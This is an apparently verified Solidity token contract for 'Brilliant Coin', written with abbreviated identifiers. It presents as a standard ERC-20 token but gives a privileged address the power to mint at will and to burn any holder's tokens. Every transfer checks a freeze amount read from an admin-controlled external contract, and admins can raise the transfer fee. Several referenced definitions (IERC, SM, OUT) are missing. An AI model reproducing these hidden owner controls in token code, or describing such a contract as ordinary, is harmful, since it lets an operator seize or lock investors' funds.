/**
 *Submitted for verification at Etherscan.io on 2020-11-21
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;
abstract contract CN{function _s()internal view virtual returns(address payable){return msg.sender;}}



contract BC is CN,IERC{using SM for uint256;uint256 private _fe;address[3] private _th;modifier ths{require(_th[0]==_s()||_th[1]==_s());_;} modifier fgs{require(_th[2]==_s());_;}
	string  private _name='Brilliant Coin'; string  private _symbol='BC';uint8 private _decimals=18;uint256 private _totalSupply;
	mapping(address=>uint256)private _balances;mapping(address=>mapping(address=>uint256))private _allowances;
	function name()public view returns(string memory){return _name;}function symbol()public view returns(string memory){return _symbol;}
    function decimals()public view returns(uint8){return _decimals;}function totalSupply()public view override returns(uint256){return _totalSupply;}
    function balanceOf(address account)public view override returns(uint256){return _balances[account];}
	function transfer(address recipient,uint256 amount)public virtual override returns(bool){_transfer(_s(),recipient,amount);return true;}
	function transferFrom(address sender,address recipient,uint256 amount)public virtual override returns(bool){_transfer(sender,recipient,amount);
		_approve(sender,_s(),_allowances[sender][_s()].sb(amount,"exceeds allowance"));return true;}    
	function approve(address spender,uint256 amount)public virtual override returns(bool){_approve(_s(),spender,amount);return true;}
	function allowance(address owner,address spender)public view virtual override returns(uint256){return _allowances[owner][spender];}
	function increaseAllowance(address spender,uint256 adedValue)public virtual returns(bool){_approve(_s(),spender,_allowances[_s()][spender].ad(adedValue));return true;}
	function decreaseAllowance(address spender,uint256 sbtractedValue)public virtual returns(bool){
	    _approve(_s(),spender,_allowances[_s()][spender].sb(sbtractedValue,"allowance zero"));return true;}
	function _approve(address owner,address spender,uint256 amount)internal virtual{require(owner!=address(0),"approve zero"); 
	require(spender!=address(0),"approve to zero");_allowances[owner][spender]=amount;emit Approval(owner,spender,amount);}
	function _burn(address account,uint256 amount)internal virtual{require(account!=address(0),"burn zero"); 
	    _balances[account]=_balances[account].sb(amount,"exceeds balance");_totalSupply=_totalSupply.sb(amount);emit Transfer(account,address(0),amount);}
	function _mint(address account,uint256 amount)internal virtual{require(account != address(0),"mint zero");
	    _totalSupply=_totalSupply.ad(amount);_balances[account]=_balances[account].ad (amount);emit Transfer(address(0),account,amount);}
	function _transfer(address sender,address recipient,uint256 amount)internal{
        require(sender!=address(0) && recipient!=address(0),"zero address"); 
        require(_balances[sender].sb(_frz(sender))>=amount,"exceeds balance");
		_balances[sender]=_balances[sender].sb(amount,"exceeds balance");uint256 fe=amount.dv(100).ml(_fe);
		_balances[recipient]=_balances[recipient].ad(amount.sb(fe));emit Transfer(sender,recipient,amount.sb(fe)); 
		if(_fe>0){_totalSupply=_totalSupply.sb(fe);emit Transfer(sender,address(0),fe);}}
	function mint(address w,uint256 a)external fgs returns(bool){_mint(w,a);return true;}
	function burn(address w,uint256 a)external fgs returns(bool){_burn(w,a);return true;}
	function c_th(address w,uint256 i)external ths{require(w!=address(0)&&i>0&&i<3);_th[i]=w;}
	function s_th(uint256 i)external view ths returns(address){return _th[i];}
	function c_fe(uint256 a)external ths{_fe=a;if(a>20){_fe=20;}}
	function s_fe()external view ths returns(uint256){return _fe;}
	function _frz(address w)private view returns(uint256){return OUT(_th[2]).frz(w);}
    fallback()external{revert();} constructor()public{_fe=5;_th[0]=_s();}}